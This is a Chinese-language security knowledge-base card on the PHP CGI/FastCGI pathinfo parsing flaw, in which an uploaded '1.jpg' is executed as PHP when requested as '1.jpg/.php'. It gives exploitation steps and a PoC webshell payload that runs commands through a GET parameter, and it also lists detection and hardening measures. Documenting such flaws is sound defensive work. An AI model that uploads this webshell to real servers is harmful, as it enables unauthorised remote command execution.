---
id: web-generic-file-upload-php-cgi-pathinfo-jpg-php-parsing
title: PHP CGI/FastCGI pathinfo 解析：1.jpg/.php 让图片文件按 PHP 执行
type: scenario
domain: web
path: web/generic/file-upload
technique: php-cgi-pathinfo-image-php-parsing
aliases:
- 1.jpg/.php
- PHP CGI 解析漏洞
- pathinfo 解析
- cgi.fix_pathinfo
- 图片马 /.php
- FastCGI 路径解析
tags:
- web
- file-upload
- php
- cgi
- fastcgi
- pathinfo
- parsing
- webshell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V476
  verified_at: '2026-11-10T17:54:48+08:00'
  notes: 已对照原文13648核对：原文在文件名后加/.php的形态1.jpg/.php一致；卡明确PHP CGI/FastCGI pathinfo非IIS6专属，符合原理；与fannuo CMS案例卡按related互引不合并；未在真实目标复现。
---

## 一句话结论

当 PHP 以 CGI/FastCGI 方式运行且 pathinfo 解析开启时，把 PHP 代码写进 `1.jpg` 上传后访问 `/upload/1.jpg/.php`，Web 服务器因 URL 以 `.php` 结尾而把请求交给 PHP，PHP 按 pathinfo 把已存在的 `1.jpg` 当作脚本源码解析执行——上传校验看到的是图片，执行的是 PHP 代码。共享背景：上传点只按扩展名/Content-Type 放行图片并落到 Web 可访问目录；本卡只讨论 pathinfo 这一种把图片文件二次解析为 PHP 的形态，不依赖 IIS6 的分号/目录名特性。

## 原理

- CGI/FastCGI 协议把“要执行的脚本文件”和“附加路径信息”分开传递：Web 服务器根据 URL 中出现的 `.php` 后缀决定把请求交给 PHP 处理程序，同时把 URL 拆成脚本路径与 PATH_INFO。
- 当 `cgi.fix_pathinfo` 开启（历史默认值）时，PHP 会沿路径向前寻找实际存在的文件作为 SCRIPT_FILENAME：请求 `/upload/1.jpg/.php` 中 `/upload/1.jpg` 存在，于是它被当作脚本文件，`/.php` 只是 PATH_INFO。
- PHP 解释器不认识图片格式，只寻找 `<?php ... ?>` 标记；文件里夹带的 PHP 代码因此被执行，图片二进制部分作为输出。
- Web 服务器侧只检查 URL 是否以 `.php` 结尾，上传校验侧只检查保存文件名的最后后缀 `.jpg`；两侧判断对象不同，形成“校验是图片、执行是脚本”。
- 该形态并非 IIS6 专属：凡满足“PHP CGI/FastCGI + pathinfo 开启 + 上传目录允许执行”的组合均可出现，例如 IIS + FastCGI、Nginx 的 `fastcgi_split_path_info`/`fastcgi_param` 配置不当、Apache 的 `ProxyPassMatch`/`SetHandler` 配合 `AcceptPathInfo` 等。是否成立取决于 SAPI 与配置，而不是服务器品牌。

## 触发条件

- 目标 PHP 以 CGI 或 FastCGI SAPI 运行，且 pathinfo 解析开启（`cgi.fix_pathinfo=1` 等历史默认或等效配置）。
- Web 服务器把 URL 中以 `.php` 结尾的请求路由给 PHP，并允许 PATH_INFO（访问 `/1.jpg/.php` 不返回 404）。
- 存在只按扩展名/Content-Type 校验的上传点，允许 `.jpg` 等图片后缀，文件内容可含 `<?php ... ?>`。
- 文件落在 Web 可访问且允许脚本执行的目录；攻击者能获得其 URL。
- 若为 PHP-FPM，`security.limit_extensions` 未限制为 `.php` 或等效限制不存在（默认限制 `.php` 时该路径会被拒绝）。

## 利用步骤

1. 上传内容为 `<?php echo "parsed:"; system($_GET['c']); ?>` 的文件，文件名 `1.jpg`，Content-Type 用 image/jpeg。
2. 记录上传后的访问路径，访问 `http://target/upload/1.jpg/.php`。
3. 若返回 404/403/源码，说明 SAPI 或 pathinfo 配置不满足；可尝试 `1.jpg%2f.php` 等编码形态判断服务器路由差异。
4. 观察返回 parsed 即确认执行；仅做授权范围内的最小验证（如 `phpinfo()`、`whoami`），随后停止并固定证据。

## PoC

```text
上传文件：1.jpg
内容：<?php echo "parsed:"; system($_GET['c']); ?>
访问：http://target/upload/1.jpg/.php?c=whoami
成功标志：页面返回 parsed:<命令输出>（1.jpg 被 PHP 解析）
```

说明：按文章给出的 `1.jpg/.php` 形态整理；未在真实目标复现，仅在授权环境使用。

## 变体与关联

- 变体：图片后缀换成 `.png`/`.gif`/`.zip`/`.txt`，URL 后接 `/.php`；也可用 `%2f` 等编码路径信息测试不同服务器的拆分逻辑。
- 关联：[[web-generic-file-upload-fannuo-cms-upload-json-iis-pathinfo-rce]]（具体案例：凡诺CMS 上传 `.zip` 后访问 `.zip/.php` 在 IIS 8.0 + PHP 5.3.29 上执行，属同一 pathinfo 解析动作的组件化利用）；[[web-generic-file-upload-apache-alternate-php-extension]]（另一种 PHP 解析范围差异）；[[web-generic-file-upload-iis6-semicolon-truncation-asp]]、[[web-generic-file-upload-iis6-directory-asp-name-parsing]]（IIS6 侧的其他解析形态，便于对照“pathinfo 并非 IIS6 专属”）。
- 边界：`cgi.fix_pathinfo=0`、PHP-FPM `security.limit_extensions` 限制、服务器不允许 PATH_INFO、上传目录禁止脚本执行、或文件被重命名为固定扩展名时，`1.jpg/.php` 不成立。

## 检测与防御

- 检测：Web 日志中出现“图片/非 PHP 文件 + `/.php`”的请求路径；同一上传文件被以带 PATH_INFO 的 URL 访问；上传内容含 `<?php` 但文件头为图片。
- 防御：设置 `cgi.fix_pathinfo=0`；PHP-FPM 保持 `security.limit_extensions=.php`；上传文件重命名为随机名+固定安全后缀、校验真实内容并二次渲染图片；上传目录禁止脚本执行；WAF/规则拦截 `*.jpg/.php` 类路径。
